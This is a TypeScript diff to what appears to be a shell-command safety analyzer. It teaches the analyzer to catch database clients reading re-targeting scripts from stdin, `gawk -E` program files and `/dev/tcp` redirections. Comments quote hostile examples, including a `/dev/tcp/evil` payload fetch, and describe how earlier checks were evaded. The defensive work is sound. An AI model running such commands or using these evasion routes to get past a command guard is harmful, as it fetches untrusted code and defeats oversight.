@@ -741,6 +741,10 @@ export function readsScriptFromStdin(segment: string): boolean {
   // `source FILE` / `. FILE` runs FILE in the CURRENT shell, and /dev/stdin names the pipe: `echo CMD | . /dev/stdin`
   // really executes CMD (exit review 5).
   if (head === 'source' || head === '.') return tokens.slice(1).some((t) => STDIN_FILE_RE.test(t));
+  // A DATABASE CLIENT WITH NO STATEMENT FLAG READS ITS SCRIPT FROM STANDARD INPUT, and that script can
+  // re-target the session with a `\c` before it does anything else (exit review 8).
+  if (DB_CLIENT_HEADS.has(head))
+    return !tokens.slice(1).some((t) => /^(-c|--command|-e|--execute|--eval|-f|--file|--query)/.test(t));
   if (!STDIN_SCRIPT_HEAD_RE.test(head)) return false;
   const shellFamily = /^(?:ba|z|da|k|a)?sh$/.test(head);
   const rest = tokens.slice(1);
@@ -946,6 +950,14 @@ export function normalizeSegment(segment: string): string[] {
     }
   }
   const extra: string[] = [];
+  // `gawk -E FILE` TAKES ITS PROGRAM FROM A FILE. Every matcher is compiled case-insensitively, so a rule there
+  // cannot tell `-E` from the extremely ordinary `-e`; this reader sees the case and can (exit review 8).
+  {
+    const t0 = tokenize(s);
+    const h0 = (t0[0] ?? '').replace(/^.*\//, '');
+    if (/^(awk|gawk|mawk|nawk)$/.test(h0) && t0.some((t, i) => t === '-E' && t0[i + 1] !== undefined))
+      extra.push(`${MARK}awk-program-file`);
+  }
   // A REDIRECTION TO `/dev/tcp` OR `/dev/udp` IS A NETWORK CONNECTION, and it needs no network binary. Both
   // directions matter: `> /dev/tcp/h/p` sends whatever the command produces, and `< /dev/tcp/h/p` makes the
   // remote side the command's INPUT — `cat 0< /dev/tcp/evil/80 > payload.sh` fetches a file EGO never read.
@@ -5648,8 +5660,22 @@ function resolveDbTarget(
   // reaches. The fully spelled form put a database and a user in front of it and escaped (exit review 7).
   // the backslash is consumed by tokenization (it is an escape wherever the shell did not keep it), so the
   // meta-command survives as the bare word `c`/`connect` immediately after psql's `-c`
+  // ...and the meta-command may live INSIDE one token, which is what a script read from standard input looks
+  // like once it is handed over as a single word (exit review 8)
+  for (const t of tokens) {
+    // the backslash is consumed by tokenization wherever the shell did not keep it, so the meta-command may
+    // survive as a bare `c`/`connect` at the start of a line of the script
+    const inTok = /(?:^|\n)\s*\\?c(?:onnect)?\s+(\S+)(?:\s+(\S+))?(?:\s+(\S+))?/.exec(t);
+    if (inTok?.[3] && inTok[3] !== '-') push(inTok[3], '\\connect host');
+  }
+  // `\c` may arrive as psql's `-c` VALUE, or as a line of the script the client reads from standard input — in
+  // which case its predecessor is whatever came before it in the SQL (exit review 8). The backslash is consumed
+  // by tokenization wherever the shell did not keep it, so both spellings are accepted.
   const connAt = tokens.findIndex(
-    (t, i) => /^\\?c(onnect)?$/.test(t) && /^(-c|--command|-f|--file)$/.test(tokens[i - 1] ?? ''),
+    (t, i) =>
+      i > 0 &&
+      /^\\?c(onnect)?$/.test(t) &&
+      (/^(-c|--command|-f|--file)$/.test(tokens[i - 1] ?? '') || DB_CLIENT_HEADS.has(tokens[0] ?? '')),
   );
   if (connAt >= 0) {
     const words = tokens.slice(connAt + 1, connAt + 5);
@@ -7258,7 +7284,14 @@ function analyzeSegments(
           : lit;
       });
       const literal = outs.some((o) => o === null) ? null : outs.join('');
-      if (literal !== null)
+      // A DATABASE CLIENT'S STANDARD INPUT IS SQL, NOT SHELL. Analysing it as a shell segment made
+      // `echo 'select 1' | psql` an unknown command; what matters is that the script can RE-TARGET the session
+      // with a `\c` before it does anything else, so the CLIENT is re-classified with the script appended and
+      // the script itself is not read as commands (exit review 8).
+      if (literal !== null && DB_CLIENT_HEADS.has(commandHead(seg)))
+        for (const h of analyzeSegments(table, ctx, compiled, [`${seg} ${requote([literal])}`], { ...state, env }, true))
+          hits.push({ ...h, via: `${h.via ?? ''} (the script this client reads from standard input)`.trim() });
+      else if (literal !== null)
         for (const h of analyzeSegments(table, ctx, compiled, [literal], { ...state, env }, true))
           hits.push({ ...h, via: `${h.via ?? ''} (carried through a pipe)`.trim() });
       else
